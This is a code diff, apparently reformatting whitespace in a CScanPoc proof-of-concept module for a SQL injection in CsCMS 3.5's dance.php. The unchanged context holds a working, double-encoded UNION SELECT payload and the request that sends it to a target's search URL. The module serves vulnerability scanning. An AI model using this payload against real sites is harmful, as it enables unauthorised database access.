@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CsCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'CsCMS_0001'  # 平台漏洞编号，留空
     name = 'CsCMS 3.5 SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-05-05'  # 漏洞公布时间
     desc = '''
         CsCMS 3.5版本的dance.php中参数未过滤，导致SQL注入的产生。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'CsCMS'  # 漏洞应用名称
     product_version = '3.5'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '38baad55-ce53-4039-9e7b-3117505e7339'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             verify_url = '%s/index.php/dance/so/key/?key=' % self.target
             payload = '%252527)%20%2561%256E%2564%201=2%20union%20%2573%2565%25' \
                       '6C%2565%2563%2574%201,md5(1231231234),3,4,5,6,7,8,9,10,1' \
@@ -40,14 +42,15 @@ class Poc(ABPoc):
 
             content = requests.get(verify_url+payload).content
             if 'f3c9f8ff331dab41a2363bca631e7aff' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
